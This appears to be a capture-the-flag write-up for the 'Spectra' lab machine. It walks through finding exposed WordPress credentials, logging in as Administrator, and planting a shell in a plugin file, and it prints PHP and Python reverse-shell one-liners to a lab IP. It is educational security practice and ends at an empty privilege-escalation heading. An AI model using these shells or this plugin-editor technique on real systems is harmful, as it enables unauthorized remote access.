# Enumeration
![nmap_scan](images/spectra/nmap_scan.png) </br>
**Initial Shell:** </br>
First, I navigated to the website and saw a simple page with two links: </br>
![mainpage](images/spectra/mainpage.png) </br>
Both links redirected me to spectra.htb, so I added this to the ```etc/hosts``` file. </br>
The second link returns: “error establishing a database connection”, but looking at the link without the ```index.php``` we get a directory listing. </br>
Most of the files there are default and have nothing interesting inside, except of one file: </br>
![testing_index](images/spectra/testing_index.png) </br>
```wp-config.php``` is the base configuration file for WordPress, where the database username and password will be stored, </br>
but clicking on it will just run the PHP on the background, however if we click at the ```wp-config.php.save``` file <br>
and viewing the source, we get this: </br>
![wpconfig](images/spectra/wpconfig.png) </br>
it looks like the Database connection information, but when trying to connect to the MySQL service, we get an error. </br>
I saved the credentials, and moved to the first link from earlier: </br>
![first_link_mainpage](images/spectra/first_link_mainpage.png) </br>
Unfourtanetly, I couldn't find any useful information, except from the 'Administrator' username, that came in use later. </br>
![administrator_username](images/spectra/administrator_username.png) </br>
Clicking on the Login link, I got redirected to WordPress login page: </br>
[wordpress_login](images/spectra/wordpress_login.png) </br>
I tried using the database information I found before, but it didn't work. </br>
I then tried using the ```Administrator``` as the username, and ```devteam01``` as the password, and it worked: </br>
![admin_dashboard](images/spectra/admin_dashboard.png) </br>
To upload a webshell, I clicked on the Plugins tab, and then the Plugin Editor: </br>
![plugin_editor](images/spectra/plugin_editor.png) </br>
The plugin is located at: http://spectra.htb/main/wp-content/plugins/akismet/akismet.php </br>
I edited it, and uploaded a one liner reverse shell: </br>
```bash
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.32/1234 0>&1'");
```

It didn't work, so I used a python reverse shell: </br>
```bash
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

and it worked: </br>
[initial_shell](images/spectra/initial_shell.png) </br>

# Privilege Escalation: 
